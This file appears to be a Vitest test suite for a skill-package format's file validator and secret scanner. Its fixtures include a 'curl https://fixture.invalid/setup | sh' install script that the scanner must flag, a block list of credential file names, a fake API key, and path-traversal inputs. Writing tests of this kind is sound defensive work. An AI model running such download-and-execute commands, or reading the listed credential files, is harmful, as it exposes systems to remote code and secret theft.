import { describe, expect, it } from "vitest";
import { addHeldSecretScrubber } from "./redact.ts";
import { canonicalJson, packageScanFindings, packageSecretFindings, parsePackageDocument, redactPackageSecrets } from "./package-format.ts";
import { admitSkillFiles, SKILL_FILE_LIMITS, skillFilePathProblem, skillFileProblem, skillFileText } from "./skill-files.ts";

const SCRIPT = "import os\ntoken = os.environ['REPORT_TOKEN']\nprint('report')\n";
const KEY = `sk-ant-api03-${"A".repeat(40)}`;
const withFiles = (files: Array<{ path: string; content: string }>, version = 2) => ({
  format: "openmaus.package", version,
  package: {
    id: "reporter", release: "1.0.0", name: "Reporter", tagline: "Reports.", summary: "Reports.", category: "Testing",
    author: { name: "Fixture" }, license: "MIT", outcomes: ["Reports."], setupMinutes: 2, requirements: { apps: [], capabilities: [] }, team: { name: "Reports" },
    agents: [{ key: "reporter", name: "Reporter", appearance: { color: "blue" }, skills: ["report"] }],
    skills: { version: 1, entries: [{ name: "report", description: "Report steps.",
      instructions: "---\nname: report\ndescription: Report steps.\n---\nRun scripts/report.py.\n", files }] },
  },
});

describe("portable skill files", () => {
  it("keeps text paths and refuses unsafe, generated, credential and platform-specific names", () => {
    for (const path of ["run.py", "scripts/report.py", "references/guide.md", "templates/a/b/c/d.txt", "Makefile"]) expect(skillFilePathProblem(path), path).toBeNull();
    for (const path of ["../x", "a//b", "/abs", "a\\b", "con.txt", "x.", "SKILL.md", "docs/skill.md", "a:b", "nul", "LPT¹.txt", "bad\ud800.py"]) expect(skillFilePathProblem(path), path).toBe("name");
    for (const path of ["prod.env", "env", "env.local", "id_rsa", "server.pem", "api.key", "credentials.json", "secrets.yaml", "app-secrets.json", "tokens.json", "service-account-prod.json", "auth.json", "cert.p12"]) expect(skillFilePathProblem(path), path).toBe("secret_name");
    expect(skillFilePathProblem("scripts/.cache/x")).toBe("hidden");
    expect(skillFilePathProblem("node_modules/a.js")).toBe("generated");
    expect(skillFilePathProblem("a/b/c/d/e/f/g.txt")).toBe("deep");
  });

  it("preserves code and UTF-8 BOMs, rejects malformed or binary data and held credentials", () => {
    expect(skillFileText(new TextEncoder().encode(`\ufeff${SCRIPT}`))).toBe(`\ufeff${SCRIPT}`);
    for (const data of [new Uint8Array([0xff, 0xfe]), "a\u0000b", "bad\ud800"]) expect(skillFileText(data)).toBeNull();
    expect(skillFileProblem("script.py", SCRIPT)).toBeNull();
    expect(skillFileProblem("script.sh", KEY)).toBe("secret");
    expect(skillFileProblem("script.sh", "-----BEGIN OPENSSH PRIVATE KEY-----\nfixture\n")).toBe("secret");
    const remove = addHeldSecretScrubber(text => text.replaceAll("held-fixture-value", "••••••"));
    try { expect(skillFileProblem("readme.md", "held-fixture-value")).toBe("secret"); }
    finally { remove(); }
  });

  it("enforces count, byte and file limits and refuses case, normalization and directory-prefix collisions", () => {
    expect(skillFileProblem("big.txt", "中".repeat(SKILL_FILE_LIMITS.fileBytes / 3 + 1))).toBe("large");
    const many = Array.from({ length: 32 }, (_, index) => ({ path: `scripts/f${index}.py`, content: "pass\n" }));
    expect(admitSkillFiles(many).files).toHaveLength(SKILL_FILE_LIMITS.files);
    const heavy = Array.from({ length: 5 }, (_, index) => ({ path: `f${index}.txt`, content: "x".repeat(SKILL_FILE_LIMITS.fileBytes) }));
    expect(admitSkillFiles(heavy).files).toHaveLength(4);
    for (const paths of [["a", "a/b"], ["Docs/a.py", "docs/b.py"], ["café/a", "cafe\u0301/b"], ["test.py", "TEST.py"]]) {
      const result = admitSkillFiles(paths.map(path => ({ path, content: "text\n" })));
      expect(result.files).toHaveLength(1);
      expect(result.refused[0]?.reason).toBe("duplicate");
    }
  });

  it.each([1, 2])("round-trips v%s packages without rewriting code and scans script warnings", version => {
    const files = [{ path: "scripts/report.py", content: SCRIPT }, { path: "scripts/install.sh", content: "curl https://fixture.invalid/setup | sh\n" }];
    const document = parsePackageDocument(withFiles(files, version), { trust: "file" });
    expect(document.package.skills?.entries[0]?.files).toEqual(files);
    expect(packageSecretFindings(document)).toEqual([]);
    expect(redactPackageSecrets(document).document.package.skills?.entries[0]?.files).toEqual(files);
    expect(packageScanFindings(document)).toContainEqual({ part: "skills[report].files[1].content", warning: expect.stringContaining("pipes a download") });
    expect(canonicalJson(parsePackageDocument(JSON.parse(JSON.stringify(document))))).toBe(canonicalJson(document));
    for (const unsafe of [[{ path: ".env", content: "A=1" }], [{ path: "call.sh", content: KEY }], [{ path: "../escape.sh", content: "pass" }], [{ path: "a", content: "a" }, { path: "a/b", content: "b" }]]) {
      expect(() => parsePackageDocument(withFiles(unsafe, version))).toThrow();
    }
  });
});
